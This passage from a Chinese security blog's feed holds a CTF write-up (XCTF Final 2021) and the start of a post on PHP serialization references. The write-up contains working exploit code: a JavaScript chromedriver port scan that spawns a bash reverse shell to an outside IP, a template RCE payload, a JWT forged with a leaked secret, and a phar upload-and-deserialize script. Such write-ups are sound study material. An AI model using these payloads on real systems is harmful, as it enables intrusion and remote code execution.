class="string">&quot;120px&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#71e8f6&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line">略</span><br><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;10&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://q1.qlogo.cn/g?b=qq&amp;nk=745679136&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height:0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span><span class="symbol">&amp;amp;</span>s=640&quot;&gt;<span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;120&quot;</span> <span class="attr">y</span>=<span class="string">&quot;25&quot;</span>&gt;</span>晚上好,来自美国(T-Mobile)的朋友<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">略</span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里有两个小细节：</p><ul><li>xml规定一份文档只能有一个根结点，也就是说我们<strong>不能</strong>闭合svg标签。如果闭合了svg标签，html会报错导致截图不全，且svg闭合后的内容不会被渲染。</li><li>由于页面没有指定 <code>DOCTYPE HTML</code> ，我们的script标签中不能出现小于号大于号，不然会被识别成xml标签。</li></ul><p>第一个问题注意即可，第二个问题我们可以通过 <code>eval(btoa(代码))</code> 的方式进行规避。<br>之后的流程参考<a href="https://paper.seebug.org/1559/%EF%BC%8C%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%EF%BC%8C%E5%B9%B6%E5%90%91webdriver%E5%8F%91%E8%B5%B7%E8%AF%B7%E6%B1%82%EF%BC%8C%E5%88%9B%E5%BB%BA%E6%96%B0%E7%9A%84%E8%BF%9B%E7%A8%8B%EF%BC%8C%E5%8F%8D%E5%BC%B9shell%E5%8D%B3%E5%8F%AF%E3%80%82%E6%96%87%E4%B8%AD%E6%B6%89%E5%8F%8A%E5%88%B0%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE%E4%BB%85%E5%85%81%E8%AE%B8localhost%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%BF%E9%97%AEwebdriver%E7%9A%84%E9%97%AE%E9%A2%98%E5%9C%A8%E6%9C%AC%E9%A2%98%E4%B8%AD%E4%B9%9F%E4%B8%8D%E5%AD%98%E5%9C%A8%EF%BC%8C%E5%9B%A0%E4%B8%BA%E5%8F%91%E8%B5%B7%E8%AF%B7%E6%B1%82%E7%9A%84%E6%AD%A3%E6%98%AFlocalhost%E3%80%82">https://paper.seebug.org/1559/，扫描端口，并向webdriver发起请求，创建新的进程，反弹shell即可。文中涉及到跨域访问仅允许localhost客户端访问webdriver的问题在本题中也不存在，因为发起请求的正是localhost。</a><br>这道题整体而言对于这样的比赛来说没有难度，但是坑比较多，比如端口量较大，往往扫不到webdriver控制端口，再比如每次请求都启动了新的chromedriver进程，导致端口不一样，所以扫描把人扫得非常沮丧。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        我所使用的js部分exploit    </div>    <div class='spoiler-content'>        <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">state</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">(<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;start&quot;</span>;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">state</span> = <span class="string">&quot;start&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="number">42</span>;</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">45000</span>; i &lt; <span class="number">65535</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i===<span class="number">3000</span>)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> x = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`http://localhost:<span class="subst">$&#123;i&#125;</span>/sessions`</span>, &#123; <span class="attr">mode</span>: <span class="string">&quot;no-cors&quot;</span> &#125;);</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;middle&quot;</span>;</span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">state</span> = <span class="string">&quot;middle&quot;</span>;</span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">state</span> = <span class="string">&quot;end&quot;</span>;</span><br><span class="line">            n = i;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> = n;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">state</span> == <span class="string">&quot;end&quot;</span>) <span class="keyword">break</span>;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> = err;</span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">state</span> = <span class="string">&quot;err&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> += <span class="string">&quot;...&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> x = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`http://localhost:<span class="subst">$&#123;n&#125;</span>/session`</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">mode</span>: <span class="string">&quot;no-cors&quot;</span>,</span><br><span class="line">            <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="string">&quot;capabilities&quot;</span>:&#123;<span class="string">&quot;alwaysMatch&quot;</span>:&#123;<span class="string">&quot;goog:chromeOptions&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;binary&quot;</span>:<span class="string">&quot;/usr/bin/python3&quot;</span>, <span class="string">&quot;args&quot;</span>: [<span class="string">&quot;-c__import__(\&quot;os\&quot;).system(\&quot;exec bash -i &amp;&gt;/dev/tcp/172.35.6.165/1234 &lt;&amp;1\&quot;)&quot;</span>]</span><br><span class="line">            &#125;&#125;&#125;&#125;),</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> += <span class="keyword">await</span> x.<span class="title function_">text</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> += <span class="string">&quot;error: &quot;</span> + err;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><svg width="480px" height="120px" fill="#a3185b" xmlns="http://www.w3.org/2000/svg"><rect fill="#5ce7a4" width="100%" height="100%"></rect><image x="10" y="10" width="100" height="100" href="http://q1.qlogo.cn/g?b=qq&amp;nk=745679136" style="height:0"></image><text x="10" y="20" id="result">46233...</text><image>&amp;s=640"&gt;</image><text x="120" y="25">晚上好,来自美国(T-Mobile)的朋友</text><text x="120" y="45">今天是 2021年5月29日 星期六</text><text x="120" y="65">您的IP是 172.35.6.165</text><text x="120" y="85">您使用的是 Mac OS 10.15.7 操作系统</text><text x="120" y="105">您使用的是 Chrome(91.0.4472.77) 浏览器</text><text x="10" y="85">仅供展示效果用</text></svg>    </div></div><h2 id="WarmupCMS">WarmupCMS</h2><p>审计代码，上手搜eval的时候发现有一个很可疑的 <code>function.math.php</code>，经查阅文档，发现cms并没有自带这个函数，故猜测这个模版函数是出题人自行实现，暂定为sink点。经过刚才的一番查文档，我们也了解到这个cms有模版功能。</p><p>我们可以通过数据库文件中的用户md5值在线反查出密码，进入后台 <code>/admincp.php</code>。</p><blockquote><p>题目中的文章需要进入后台刷新缓存后才能显示</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> `icms_user` (`uid`, `gid`, `pid`, `username`, `nickname`, `password`, `gender`, `fans`, `follow`, `comments`, `article`, `favorite`, `credit`, `regip`, `regdate`, `lastloginip`, `lastlogintime`, `hits`, `hits_today`, `hits_yday`, `hits_week`, `hits_month`, `setting`, `type`, `status`) <span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">1</span>, <span class="number">65535</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;iCMS&#x27;</span>, <span class="string">&#x27;798709465daad71e1665888975791d7b&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">1488883427</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">1523165779</span>, <span class="number">303</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="string">&#x27;&#123;\&quot;inbox\&quot;:&#123;\&quot;receive\&quot;:\&quot;all\&quot;&#125;&#125;&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><img src="/2021/05/30/Security/Writeup/XCTF-Final-2021/backend.png" class=""><p>进入后台后不难发现cms作者的本意是不想让我们在网页上直接修改模版，对可以上传的文件后缀的设置也做了限制，作者还是进行了一些河里的思考的。</p><img src="/2021/05/30/Security/Writeup/XCTF-Final-2021/deny.png" class=""><p>可惜cms的上传目录可以相对于 <code>$webroot</code> 任意指定，而cms放置模版的目录正位于 <code>$webroot/template</code> 下。我们可以指定任意文件作为主页、文章等页面的模版（如 <code>htm</code> 文件），而 <code>htm</code> 处于上传后缀白名单中。也就是说我们可以将 <code>上传目录</code> 设置为 <code>template</code>，然后上传一份htm文件，在文件管理中获取到上传的文件名，并将其设置为主页模版，即可利用模版进行RCE。</p><img src="/2021/05/30/Security/Writeup/XCTF-Final-2021/specify_template.png" class=""><img src="/2021/05/30/Security/Writeup/XCTF-Final-2021/modify_settings.png" class=""><img src="/2021/05/30/Security/Writeup/XCTF-Final-2021/filename.png" class=""><p>回到math。虽然函数实现中对危险函数进行了限制，但我随手构造的 <code>&lt;!--&#123;math equation=(system(&quot;/readflag&quot;))&#125;--&gt;</code> 恰巧突破了这一限制（带括号）（又貌似是缓存有助攻）。由于是比赛，时间紧迫，便没有深究。</p><img src="/2021/05/30/Security/Writeup/XCTF-Final-2021/warmup_flag.png" class=""><h2 id="easy-cms">easy_cms</h2><p>由于题目并没有正确配置php服务器，我们需要通过手动指定controller来访问所有页面。</p><p>thinkphp，那我们先来看看有什么controller呗。</p><p>admin下的controller由于需要登录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">captcha_check</span>(<span class="variable">$data</span>[<span class="string">&#x27;verify&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ValidateException</span>(<span class="string">&#x27;验证码错误&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkLogin</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;登录成功&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;admin/Index/index&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而服务端并没有安装图片相关拓展：</p><img src="/2021/05/30/Security/Writeup/XCTF-Final-2021/not_installed.png" class=""><p>所以登陆admin这条路基本是堵死了，也没必要继续看admin controller（当然不排除有些未认证的controller，只是这题确实没有）</p><p>在api 的 <code>Base</code> controller中我们发现有很明显的上传文件的方法，也有读取文件的方法，非常显然是让我们用phar反序列化来加载tp6的链。所以问题就在于如何登陆。我们回头看一眼路由，发现 <code>Base</code> controller被套了一个 <code>JwtAuth</code> 中间件。这一中间件取 <code>Authorization</code> 请求头的值作为jwt进行验证，认证通过则取token中的uid写入当前session。<code>JwtAuth</code> 调用了 <code>Jwt</code> 类，而生成 <code>Jwt</code> 的 api controller <code>Common</code> 中配置了jwt的参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// route.php</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">rule</span>(<span class="string">&#x27;Base/Upload&#x27;</span>, <span class="string">&#x27;Base/Upload&#x27;</span>)-&gt;<span class="title function_ invoke__">middleware</span>([<span class="string">&#x27;JwtAuth&#x27;</span>]); <span class="comment">//图片上传;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Common controller</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$jwt</span></span><br><span class="line">    -&gt;<span class="title function_ invoke__">setIss</span>(<span class="title function_ invoke__">config</span>(<span class="string">&#x27;my.jwt_iss&#x27;</span>))</span><br><span class="line">    -&gt;<span class="title function_ invoke__">setAud</span>(<span class="title function_ invoke__">config</span>(<span class="string">&#x27;my.jwt_aud&#x27;</span>))</span><br><span class="line">    -&gt;<span class="title function_ invoke__">setSecrect</span>(<span class="title function_ invoke__">config</span>(<span class="string">&#x27;my.jwt_secrect&#x27;</span>))</span><br><span class="line">    -&gt;<span class="title function_ invoke__">setExpTime</span>(<span class="title function_ invoke__">config</span>(<span class="string">&#x27;my.jwt_expire_time&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// config/my.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//jwt鉴权配置</span></span><br><span class="line"><span class="string">&#x27;jwt_expire_time&#x27;</span>    =&gt; <span class="number">7200</span>,               <span class="comment">//token过期时间 默认2小时</span></span><br><span class="line"><span class="string">&#x27;jwt_secrect&#x27;</span>        =&gt; <span class="string">&#x27;boTCfOGKwqTNKArT&#x27;</span>, <span class="comment">//签名秘钥</span></span><br><span class="line"><span class="string">&#x27;jwt_iss&#x27;</span>            =&gt; <span class="string">&#x27;client.xhadmin&#x27;</span>,   <span class="comment">//发送端</span></span><br><span class="line"><span class="string">&#x27;jwt_aud&#x27;</span>            =&gt; <span class="string">&#x27;server.xhadmin&#x27;</span>,   <span class="comment">//接收端</span></span><br></pre></td></tr></table></figure><p>从配置文件中拿到jwt secret，仔细过一遍认证函数，把必要的属性都给加上，再把过期时间 (<code>exp</code>) 调的久一些，一个jwt就伪造好了</p><img src="/2021/05/30/Security/Writeup/XCTF-Final-2021/fake_token.png" class="" title="四千年后过期的token"><p>带着这个token，我们就能上传文件了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">host = <span class="string">&#x27;http://172.35.6.101:31337&#x27;</span></span><br><span class="line">info = ses.post(host+<span class="string">&#x27;/?s=api/Base/upload&#x27;</span>, headers=&#123;</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>: </span><br><span class="line">        <span class="string">&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.&#x27;</span></span><br><span class="line">        <span class="string">&#x27;eyJzdWIiOiIxMjM0NTY3ODkwIiwidWlkIjoxL&#x27;</span></span><br><span class="line">        <span class="string">&#x27;CJpc3MiOiJjbGllbnQueGhhZG1pbiIsImF1ZC&#x27;</span></span><br><span class="line">        <span class="string">&#x27;I6InNlcnZlci54aGFkbWluIiwiZXhwIjoxNTE&#x27;</span></span><br><span class="line">        <span class="string">&#x27;2MjM5MDIyMDAsImlhdCI6MTUxNjIzOTAyMn0.&#x27;</span></span><br><span class="line">        <span class="string">&#x27;vbtgheHpxnrT9W4VX1ybguJ15cwYO2pbVNCvrE7FqfU&#x27;</span></span><br><span class="line">&#125;, files=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;a.gif&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;phar.gif&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">&#125;).json()</span><br><span class="line"><span class="built_in">print</span>(info)</span><br><span class="line"><span class="comment"># &#123;&#x27;status&#x27;: &#x27;200&#x27;, &#x27;data&#x27;: &#x27;/uploads/api/202105/60b3b5da99bed.gif&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>同时，上传文件的 <code>upload</code> 方法下面就有 <code>checkFileExists</code> 方法，可以用于触发 phar 反序列化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">req = ses.get(host, params=&#123;</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;api/Base/checkFileExists&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;filepath&#x27;</span>: <span class="string">&#x27;phar:///var/www/html/public&#x27;</span>+info[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    <span class="comment"># 经过和出题人沟通，在比赛题目环境中必须使用绝对路径</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(req.text[-<span class="number">200</span>:])</span><br></pre></td></tr></table></figure><p>tp6的链略，<a href="https://lmgtfy.app">https://lmgtfy.app</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Prologue&quot;&gt;Prologue&lt;/h2&gt;
&lt;p&gt;这应该是我个人最近最后一场比赛了，整体而言挺开心的，还和诸葛老师合了影（&lt;/p&gt;
&lt;h2 id=&quot;dngs2010&quot;&gt;dngs2010&lt;/h2&gt;
&lt;p&gt;由于源码里摆明了让我们去选svg，那我们就去选svg。&lt;b</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://blog.frankli.site/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.frankli.site/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>PHP序列化中的R与r</title>
    <link href="https://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/"/>
    <id>https://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/</id>
    <published>2021-04-10T16:00:00.000Z</published>
    <updated>2021-05-20T08:32:43.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近想起来 <a href="https://github.com/frankli0324/libphpserialize">libphpserialize</a> 还有一个TODO，实现递归对象的序列化，顺手写写php序列化中&quot;r&quot;与&quot;R&quot;的意义</p></blockquote><h2 id="引用">引用</h2><p>引用到底是什么？是一个指针的语法糖么？是一个指针对象指向了另一个对象？<br>我更愿意将其理解为一个 <em><strong>更加</strong></em> 抽象的概念。<br>要理解这个概念首先需要将“对象”和“引用”两个概念剥离开来，跳出“具体实现”的桎梏。</p><hr><p>我们手里拿着一个数据的“引用”时，我们并没有在拿这个数据本身。<br>我们对其解引用(deference)时我们就拿到了真实的对象本身。</p><img src="/2021/04/11/Security/php-src/PHP-Serialize-tips/reference_dark.png" class=""><p>听起来非常的指针。其实不然，指针没有这么抽象，指针存在于C语言中，它存在的意义并没有这么抽象。我们平时说指针“指向了一个对象”实际上是我们自己不知不觉间对其进行了更高层级的抽象，让它“成为了”我们脑海中对另一个对象的引用。实际上没这么复杂，它本初存在的意义就是为了存一个地址。</p><img src="/2021/04/11/Security/php-src/PHP-Serialize-tips/pointer_dark.png" class=""><p>像我们常用的Python，Java等直接操作引用的语言，将我们的对象全部藏了起来，给到我们手里的全部都是引用。当我们对这些对象进行操作的时候神の手(Kami no te)帮我们进行了一次解引用，再对对象进行了一系列操作。</p><img src="/2021/04/11/Security/php-src/PHP-Serialize-tips/operation_dark.png" class=""><p>理解了这一点，我们就能轻松地理解PHP序列化字符串中R与r的区别。</p><h2 id="prologue">prologue</h2><blockquote><p>既然打了 <code>php-src</code> 的tag，就引用一下源码8</p></blockquote><p>在php中，反序列化的实现主要存在与 <code>ext/standard/var_unserializer.re</code> 中。建议先打开这个文件放到一边再往下看。<br>这一文件利用<a href="https://github.com/skvadrik/re2c">re2c</a>进行了代码生成。<br>re2c的作用，简而言之，就是将正则转换为一个goto模样的<strong>确定</strong>有限状态自动机，以供编译。这样能够实现 <em><strong>类似</strong></em> 很多其它语言支持的模式匹配的效果。PHP中很多地方都用到了re2c。</p><p>我们先对php中反序列化的流程大致熟悉一下，标蓝色的地方是处理R与r的code block行数(php 7.4.6)<br>由于右侧的图比较糊，建议自己生成一份看：<br><code>re2c -D -8 ext/standard/var_unserializer.re | dot -Tpng -o output.png</code></p><img src="/2021/04/11/Security/php-src/PHP-Serialize-tips/call_graph_dark.png" class=""><p>下文中都会以反序列化的代码来说明问题。看完了反序列化的代码再看序列化(<code>ext/standard/var.c</code>)会发现其实它们的结构逻辑都是非常类似的。博客里就不多说了。</p><h2 id="R与r">R与r</h2><p>当两个对象本来就是同一个对象时后出现的对象将会以小写r表示。<br>不过基础类型不受此条件限制，总是会被序列化</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        为什么？（看完“分析”以后再看这里）    </div>    <div class='spoiler-content'>        <p>.<br>还记得<code>var_hash-&gt;last</code>么？<br>在序列化过程中，与<code>var_push</code>作用类似的函数长这样</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> zend_long <span class="title">php_add_var_hash</span><span class="params">(<span class="type">php_serialize_data_t</span> data, zval *var)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (!is_ref &amp;&amp; <span class="built_in">Z_TYPE_P</span>(var) != IS_OBJECT) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="comment">// 因为这里</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ( existed ) <span class="keyword">return</span> index;</span><br><span class="line">    <span class="keyword">else</span> add_new &amp;&amp; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中判断了对象<code>IS_OBJECT</code>，而<code>zval</code>常规类型有下列几种：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">IS_UNDEF</span><br><span class="line">IS_NULL</span><br><span class="line">IS_FALSE</span><br><span class="line">IS_TRUE</span><br><span class="line">IS_LONG</span><br><span class="line">IS_DOUBLE</span><br><span class="line">IS_STRING</span><br><span class="line">IS_ARRAY</span><br><span class="line">IS_OBJECT</span><br><span class="line">IS_RESOURCE</span><br><span class="line">IS_REFERENCE</span><br></pre></td></tr></table></figure>    </div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="number">1</span>; <span class="variable">$x</span>-&gt;b = <span class="variable">$x</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:1;&#125; // 基础类型</span></span><br><span class="line"><span class="variable">$y</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="variable">$y</span>; <span class="variable">$x</span>-&gt;b = <span class="variable">$y</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;O:8:&quot;stdClass&quot;:0:&#123;&#125;s:1:&quot;b&quot;;r:2;&#125;</span></span><br><span class="line"><span class="comment">// id(a) == id(b)，二者都是$y;</span></span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="variable">$x</span>; <span class="variable">$x</span>-&gt;b = <span class="variable">$x</span>;</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;r:1;s:1:&quot;b&quot;;r:1;&#125;</span></span><br></pre></td></tr></table></figure><p>而当PHP中的一个对象如果是对另一对象显式的<strong>引用</strong>，那么在同时对它们进行序列化时将通过大写R表示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;b = &amp;<span class="variable">$x</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="分析">分析</h2><h3 id="R与r的不同处理">R与r的不同处理</h3><p>对于“同一个对象”，php直接对取出的对象引用进行了一次解引用，便将这个 <em><strong>对象</strong></em> 赋给了右值。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 